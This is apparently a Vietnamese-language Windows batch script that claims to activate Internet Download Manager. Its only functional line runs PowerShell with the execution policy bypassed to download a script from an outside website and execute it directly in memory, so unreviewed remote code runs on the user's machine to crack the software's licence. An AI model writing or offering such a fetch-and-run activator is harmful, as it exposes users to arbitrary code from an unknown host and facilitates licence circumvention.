@echo off
title KICH HOAT INTERNET DOWNLOAD MANAGER (IDM)
echo ==========================================
echo    DANG KICH HOAT CONG CU ACTIVE IDM (IAS)
echo ==========================================
echo.
echo [!] Vui long cho trong giay lat de tai du lieu...
echo.

:: Chạy lệnh PowerShell gọi mã kích hoạt IDM công khai
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://coporton.com/ias | iex"

exit
